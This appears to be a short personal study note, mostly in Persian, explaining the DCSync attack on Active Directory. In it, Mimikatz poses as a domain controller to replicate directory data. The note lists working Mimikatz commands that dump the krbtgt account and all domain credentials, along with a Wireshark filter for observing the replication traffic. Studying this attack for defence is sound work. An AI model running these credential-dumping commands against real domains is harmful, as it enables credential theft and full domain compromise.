
simulate DC  ----> Request ----> AD  Object Update

privilege = DC-Replication-Get-Changes -----> API 
این API برای  ارسال این درخوست به طرفه AD اصلی هستش 


در این حمله هاست ما که ابزار Mimikatz رو میشه میایم و یک ارتباط (Trust) با domain اصلی راه میندازیم 
یعنی mimikatz ما میاد برای ما یک Replicate با DC راه میندازه تا بیاد برای ما منابع AD اصلی رو بگیره 
در این حمله برای اینکه بخواد DC تقلبی ما بخواد منابع  DC اصلی رو بگیره باید یک AD Object Request بفرسته
و وقتی که AD این درخواست رو فرستاد AD اصلی update ها رو ارسال میکنه 


```
lsadump::dcsync /user:krbtgt
```

ما میتونیم از طریق Wireshark بیایم و اون ترافیک که شامل API میشه رو ببینیم 


Query Wireshark 
```
ip.addr==x.x.x.x and!(dns)
```


![[Pasted image 20250901055434.png]]

Not Set User

```
lsadump::dcsync /user:all
```

Just Credential 
```
lsadump::dcsync /all /csv
```
